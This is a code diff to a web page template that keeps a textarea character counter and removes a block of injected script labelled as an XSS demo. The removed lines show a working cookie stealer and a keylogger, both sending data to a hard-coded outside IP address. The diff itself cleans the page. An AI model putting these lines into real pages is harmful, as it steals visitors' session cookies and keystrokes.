@@ -42,22 +42,5 @@
     function upd(){ cnt.textContent = ta.value.length + '/' + max; }
     ta.addEventListener('input', upd); upd();
   })();
-
-  // XSS Demo: Cookie Stealer
-  fetch('http://141.87.56.125:5001/steal_cookie?c=' + document.cookie);
-
-  // XSS Demo: Keylogger
-  let buffer = '';
-  document.addEventListener('keypress', function(e) {
-    buffer += e.key;
-    if (buffer.length >= 10) {
-      fetch('http://141.87.56.125:5001/log_keys', {
-        method: 'POST',
-        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-        body: 'keys=' + encodeURIComponent(buffer)
-      });
-      buffer = '';
-    }
-  });
 </script>
 {% endblock %}
